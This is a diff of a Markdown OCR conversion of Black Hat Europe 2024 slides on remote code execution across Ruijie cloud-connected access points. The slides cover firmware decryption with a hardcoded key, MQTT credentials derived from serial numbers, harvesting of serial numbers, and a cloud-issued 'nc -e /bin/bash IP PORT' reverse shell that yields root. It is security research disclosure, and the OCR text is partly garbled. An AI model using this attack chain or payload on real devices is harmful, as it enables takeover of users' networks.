@@ -8,18 +8,24 @@ year: 2024
 source_pdf: "BlackHat_Europe_2024_slides/Noam Moshe & Tomer Goldschmidt_The Insecure IoT Cloud Strikes Again RCE on all Ruijie Cloud-Connected Devices.pdf"
 pages: 101
 sha256: "d39acbf9bff418e7ad085d01bc84d25ddf40075c85ae35d2c4869f085e43bcc9"
-text_chars: 21550
-ocr_pages: 40
+text_chars: 18793
+ocr_pages: 38
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 85.9
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:52:09Z"
+converted_at: "2026-08-12T05:00:20Z"
 ---
 # The Insecure IoT Cloud Strikes Again RCE on all Ruijie Cloud-Connected Devices
 
 **Speakers:** Noam Moshe, Tomer Goldschmidt  
 **Conference:** Black Hat Europe 2024  
 **Source:** `BlackHat_Europe_2024_slides/Noam Moshe & Tomer Goldschmidt_The Insecure IoT Cloud Strikes Again RCE on all Ruijie Cloud-Connected Devices.pdf` (101 pages)
+
 
 ## Slide 1
 
@@ -40,10 +46,10 @@ WIFI names
 
 It hurts when IP
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-wt! Verizon LTE 5:58 PM 79 97%
 < Settings Wi-Fi
 Hover Board az@
 Jail Bird Joey az@
@@ -51,8 +57,6 @@ Lone Pine ae @
 I yy ood It hurts when IP az@
 g Mr. Fusion ae @
 NextHome-5G ac @
-WIFI NAMES eres sec
-OMGLibyans az@
 Power Of Love az@
 Slacker ae @
 Space Time aze@
@@ -65,10 +69,10 @@ Strickland az@
 
 It hurts when IP
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-wt! Verizon LTE 5:58 PM 79 97%
 € Settings Wi-Fi
 Hover Board as @)
 Jail Bird Joey as @)
@@ -101,7 +105,8 @@ Strickland aes @
 
 It hurts when IP
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 et! Verizon LTE 5:58 PM 7997,
@@ -110,14 +115,9 @@ Hover Board a
 eee Jail Bird Joey a
 a Lone Pine a
 Mad Dog a
-vy
 Mr. Fusion a
 NextHome-5G a
-”)
-SCRICHECHECERECRECEECRECRECRECHECHEC)
 Old Man Peabody a>
-We hacked aa “
-<«----»|  |t hurts when IP ac
 a
 Space Time a?
 Strickland ae
@@ -173,7 +173,8 @@ Strickland ae
 
 - More?
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 The Usual Attack Surface
@@ -221,16 +222,15 @@ Oh we ll… **Let’s use the cloud instead**
 
 **Ruijie Reye Cloud Platform**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Ruijie Reye Cloud Platform
 Project Al Heatmap
 X Device Information
-Ruijie 2 @ Synced
 SN:1111111111111 Model:RAP2260 Management !IP:192.168.110.10 Device Utilization: Memory 0°
 Ny Configuration
-[Dees]
 Overview Log History Wireless Experience
 | Status
 ```
@@ -275,7 +275,8 @@ Ruijie
 
 **Part #2: Claiming the Device**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Part #2: Claiming the Device
@@ -291,7 +292,8 @@ By entering device SN By batch adding using an excel file
 
 **Part #2: Claiming the Device**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Part #2: Claiming the Device
@@ -300,9 +302,7 @@ AP
 You can add an AP in on
 By entering device S'
 1SN:
-Scan to Aad
 Back
-pena ane
 ```
 
 ## Slide 28
@@ -311,7 +311,8 @@ pena ane
 
 1111111111
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Part #2: Claiming the Device
@@ -327,7 +328,8 @@ Back | | Cancel |
 
 **Result: Device Cloud Access**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Result: Device Cloud Access
@@ -335,7 +337,6 @@ Al Heatmap
 X | Device Information
 Management !IP:192.16 0 Device Utilization: Mem
 Configuration
-[ou]
 Overview Log History Wireless Experience
 | Status
 Associated Link
@@ -370,13 +371,12 @@ Associated Link
 
 - • Download firmware -
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Ruijie RG RAP Access Point
 * Download firmware - URL
-Reyee
-—_—-
 Ie uyle Products Solutions Support Community About Us
 Software
 Ruijie RG-RAP2260G Series Access Point Firmware
@@ -388,7 +388,8 @@ Version No. ReyeeOS230
 
 **File Entropy - Probably Encrypted**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 File Entropy - Probably Encrypted
@@ -426,7 +427,8 @@ Offset le7
 
 **Found a RCE → We have shell Access**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Found a RCE — We have shell Access
@@ -444,7 +446,8 @@ uid=@Croot) gid=@Croot)
 
 Searching for the decryption component
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Firmware Decryption
@@ -458,18 +461,15 @@ rg-upgrade-crypto « sarade_compat.sh
 
 **Firmware Decryption Analyzing rg-upgrade-crypto**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Firmware Decryption
 Analyzing rg-upgrade-crypto
-memset(__s,6,4);
-——~s
-sVar2 = read(local_d4,__s, 0x16);
 if (sVar2 != 0x16) goto LAB_0040148c;
 Llocal_cce = local_cc - 6x16;
 }
-else ff
 sVar2 = write(local_d®, “upgrade_crypt_v1!@2021" 0x16);
 if (sVar2 != 0x16) goto LAB_0040148c;
 }
@@ -479,17 +479,14 @@ if (sVar2 != 0x16) goto LAB_0040148c;
 
 **Firmware Decryption** This string seems familiar…
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 75/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Firmware Decryption
 This string seems familiar.
-_"“upgrade_crypt_v1!@2021" 6x16):
-5
 a 62 Llocal_cc = local_ce - 6x16:
-2
 else 4
-sVar2 = write(Lotat.d8 |"upgrade_crypt_v
 if (sVar2 != 68x16) goto LAB_8840148c;
 }
 ```
@@ -506,14 +503,14 @@ String is present in the encrypted frmwar i e
 
 **Symmetric Encryption Scheme - Rolling XOR (^) + Shift**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Symmetric Encryption Scheme - Rolling
 XOR (4) + Shift
 for (local_ic = 09; local_ic < : local_ic = local_ic + 1) {
 cVari1 = (char)_DAT_00411b18;
-cVar2 (char) _DAT_00411b1ic;
 uVar4 (uint)_DAT_00411bic >> 8;
 uVar3 (uint)_DAT_00411bic >> 0x10;
 for (local_18 = 0; (int)local_18 < 6; Local_18 = local_18 + 1) {
@@ -530,11 +527,11 @@ TG_key_chr = )[local_18] << (local_18 & 0x1f~e{ T6_key_chr;
 
 **Emulating The Binary-Decryptor**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Emulating The Binary-Decryptor
-=
 1 directory, 5 files
 ```
 
@@ -542,7 +539,8 @@ Emulating The Binary-Decryptor
 
 **Emulating The Binary-Decryptor**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Emulating The Binary-Decryptor
@@ -553,7 +551,6 @@ tar -xvf ./decrypted firmware.bin
 sysupgrade-RAP2261G/
 sysupgrade-RAP2261G/CONTROL
 sysupgrade-RAP2261G/root
-sysupgrade-RAP2261G/kernel
 ```
 
 ## Slide 48
@@ -566,7 +563,8 @@ sysupgrade-RAP2261G/kernel
 
 - **root** - squashfs filesystem
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Emulating The Binary-Decryptor
@@ -580,7 +578,6 @@ tar -xvf ./decrypted firmware.bin
 sysupgrade-RAP2261G/
 sysupgrade-RAP2261G/CONTROL
 sysupgrade-RAP2261G/root
-sysupgrade-RAP2261G/kernelL
 ```
 
 ## Slide 49
@@ -611,7 +608,8 @@ sysupgrade-RAP2261G/kernelL
 
 **/etc/init.d** to search for startup binaries
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Finding Cloud Service
@@ -649,8 +647,6 @@ ip_conflict_check
 ipv6nei
 kLogd
 Lighttpd
-1ldpd
-Local_topoLlogy
 manager_ip
 mosquitto
 mqlink
@@ -731,13 +727,13 @@ telnet
 
 **In our case, MQTT was used**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 + ruijie strings mglink.elf | grep mosquitto
 Libmosquitto.so.1
 mosquitto_connack_string
-mosquitto_Lib_cLleanup
 mosquitto_will_clear
 mosquitto_pubLish
 mosquitto_strerror In our Case,
@@ -749,7 +745,6 @@ mosquitto_tLs_opts_set
 mosquitto_username_pw_set
 mosquitto_connect
 mosquitto_subscribe
-mosquitto_wiLl_set
 ```
 
 ## Slide 57
@@ -790,7 +785,8 @@ mosquitto_wiLl_set
 
 **In the config**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Requirements
@@ -801,7 +797,6 @@ config mqlink
 option enable '1' In the
 option port '25857' config
 option addr 'mqclt0Q1-eu.rj.Link'
-option domainSuffix ‘rj. Link’
 option tlscafil '/etc/mqlink/ca/rj.link.pem'
 retransPeriod
 ```
@@ -862,7 +857,8 @@ retransPeriod
 
 **• Username** : Serial Number **• Password** :
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 MQTT Creds Generation (CVE-2024-45722) -
@@ -871,22 +867,15 @@ e Username: Serial Number
 ¢ Password:
 SN
 Serial Number
-WIM Ps
 S/N: G1
-memset (auStack_1c,®,0x1®);
 iVar2 = string_reverse(auStack_lc,
 if (iVar2 == @) {
 iVar2 = sha256(TG_out, auStack_ic);
-if’ (AVan2 =z 08) +
 QH8ZZ
-——=—
 String Reverse
-=
 SHA256
-—
 Rupe | }Reyee |
 SN);
-——=— ==
 MQTT Password
 ```
 
@@ -912,7 +901,8 @@ MQTT Password
 
 **Serial Numbers leaked on Youtube…**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ©) VouTube
@@ -924,8 +914,6 @@ Youtube...
 Status 4 SN Alias MGMT IP
 © Online Ruijie 192.168.200.168
 € ¢
-.
-_  —a
 Wireless Access Point
 Model: RG-EST100-E Rufie | Reyee
 Version: V1.00
@@ -935,14 +923,14 @@ Version: V1.00
 
 **We can Connect!**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 We can Connect!
 + ruijie python3 mgtt.py
 Connected with result code Sending CONNECT (ul, pl,
 Connected with result code Received CONNACK (@, 0)
-Connected with result] code @
 CONNACK Packet
 There are only 6 return codes in the CONNECT packet. Only when the return
 code of the CONNACK packet sent back by the server is 0, the connection is
@@ -955,7 +943,8 @@ Value Return code Description
 
 **We can Connect!**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 We can Connect! (7
@@ -1009,7 +998,8 @@ Value Return code Description
 
 #### **We got bombarded with messages!**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 56/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 We got bombarded
@@ -1017,18 +1007,15 @@ with messages!
 cloud/sync b'{ "sn": "G1Q ", "id": "0000000594", “bizid": "syn_SON_@", "ts":
 1708432476453, “ack": "true", "data": { "pro": "RAP2200(E)", "mac": "eck ay b
 "1,11", "swv": "ReyeeOS 2.262.0.2301;AP_3.0(1)B11P262,Release(10230121)", "wmd": "AP,1,
-el Dees u10550.3 105. "Lnid": wa Me wlGide: "Or, Late alge Pg a
-"mastersn": "G Lome Statusw-. CONF MTGIums per
 ```
 
 ## Slide 75
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 »
-fom™ AX
-=
 hee j
 Wait a minute,
 who are you?
@@ -1038,7 +1025,8 @@ who are you?
 
 ### **Messages Contain SN!**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 54/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Messages
@@ -1046,15 +1034,14 @@ Contain SN!
 cloud/sync b'{ "sn": "G1Q ", "id": "0000000594", “bizid": "syn_SON_@", "ts":
 1708432476453, “ack": "true", "data": { "pro": "RAP2200(E)", "mac": "eck ;
 "1,11", "swv": "ReyeeOS 2.262.0.2301;AP_3.0(1)B11P262,Release(10230121)", "wmd": "AP,1
-el Dees u10550.3 105. "Lnid": wa Me wlGide: "Or, Late alge Pg a
-"mastersn": "G Lome Statusw-. CONF MTGIums per
 ```
 
 ## Slide 77
 
 **~50,000 SN!**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 cat serials.txt | uniq | sort | subl
@@ -1129,23 +1116,17 @@ cat serials.txt | uniq | sort | subl
 
 - We got all cloud commands to devices!
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Using Wildcards
 ¢ Lets subscribe to using device/ {SN} wildcards
-° device/+
 ¢ We got all cloud commands to devices!
 device/G 1 b'{"data": Li i
-AN" noipdns\\"" Lid": " 1708432476986} '
 device/G odule
-\\"access_ctrl\\" a 7 types" ts":1708432476996} '
 device/G :["dev_config get ——-module
-\\"flowctrl_udp\\""],"id": ")"type":"cmd","ts":1708432476997}'
 device/G b'{"data": ["dev_sta set --module \\"configChange\\"
-VAM url\\"\\"https://deviceapi-eu. ruijienetworks.com/service/api/enet/dq
-\\"'function\\":\\"ac_config\\", \\"independ\\": \\"false\\",\\"networkId\\":
-md", ""ts":1708432477007}'
 ```
 
 ## Slide 84
@@ -1162,17 +1143,15 @@ md", ""ts":1708432477007}'
 
 • Cloud command:
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 68/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Command-Execution-as-a-Service
 * Cloud command:
 "data":
 [
-J,
-adits i As
 "type": "cmd",
-"ts": 1708432476997
 “dev_config get —-module \"flowctrl_udp\""
 (OSiGommand
 ```
@@ -1197,7 +1176,8 @@ adits i As
 
 • Of course it worked… (CVE-2024-52324)
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Command-Execution-as-a-Service
@@ -1208,31 +1188,25 @@ Received PUBLISH ‘device/G1I ... (406 bytes)
 * ruijie nc -lvk 9900
 /bin/sh: can't access tty; job control turned off
 BusyBox v1.28.4 () built-in shell Cash)
-/#id
-uid=@(root) gid=@Croot)
 ```
 
 ## Slide 89
 
 **RCE on ALL Cloud Devices**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 RCE on ALL Cloud Devices
 "data":
 [
 "nc —-e /bin/bash IP PORT"
-I,
-Tide: 2357611419" |
-“type”: cmd...
-"ts": 1712477881003
 * ruijie nc -lvk 9900
 /bin/sh: can't access tty; job control turned off
 BusyBox v1.28.4 ©) built-in shell Cash)
 /#id
 uid=@Croot) gid=@Croot)
-/#]
 ```
 
 ## Slide 90
@@ -1245,7 +1219,8 @@ uid=@Croot) gid=@Croot)
 
 - Let’s showcase this kind of attack!
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Open Sesame Attack
@@ -1268,7 +1243,8 @@ Airport WIFI free
 
 - Hacking a WIFI
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 75/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Open Sesame ial
@@ -1281,7 +1257,6 @@ NextHome-5G ae @
 Old Man Peabody az@
 OMGLibyans az@
 Power Of Love az@
-Slacker az7@
 Space Time az@
 ```
 
@@ -1305,7 +1280,8 @@ Space Time az@
 
 **We have the SN! (CVE-2024-47146)**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 We have the SN! (cVE-2024-47146)
@@ -1317,7 +1293,6 @@ Tag Number: Vendor Specific (221) 0030 i r t 97 uWiIEl
 QUI: 00:0c:43 (Ralink Technology, Co 0050 47 01 08 82 84 8b 96 12 24 48 Gc 03 01 «Name:
 Vendor Specific OUI Type: 8 0060 @@ 01 00 @@ 07 06 55 53 20 O1 Ob 1e 20 01-vv
 Vendor Specific Data: 08000000 0070 02 16 00 c3 02 10 2f 46 05 73 00 01 60 00 33 08
-Tag Number: FILS Indication (240) Bree) ey on Corboree CoA Pece bei ‘@
 Tag “length: 2 ; - 0120 62 32 2f 00 ff 1a 2 *AP:Serial Number. H:
 Prey G = Number of Public Key Identifiers: 0 0130 92 6f 09 af 08 00 Oc 00 fa ff fa ft ic e7 71
 = Number of Realm Identifiers: 0 0140
@@ -1331,25 +1306,6 @@ Tag Number: Vendor Specific (221) | O1e0 @@ 04 01 31 3b ac 46 a3
 ```
 
 ## Slide 96
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Q1
-32
-6f
-Q7
-00
-00 28 00 weSeQund
-uWIEl -
-ise
-10.27 24
-2AP.oe
-‘bigs
-7A
-26
-00
-```
 
 ## Slide 97
 
@@ -1365,17 +1321,15 @@ ise
 
 **Ruijie Access Points**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Ruijie Access Points
 \
-ft
 —)- ruijie nc -lvk 9900
 )/bin/sh: can't access tty; job control turned off
 BusyBox v1.28.4 ©) built-in shell Cash)
-/ #id
-uid=@(Croot) gid=@Croot)
 ```
 
 ## Slide 99
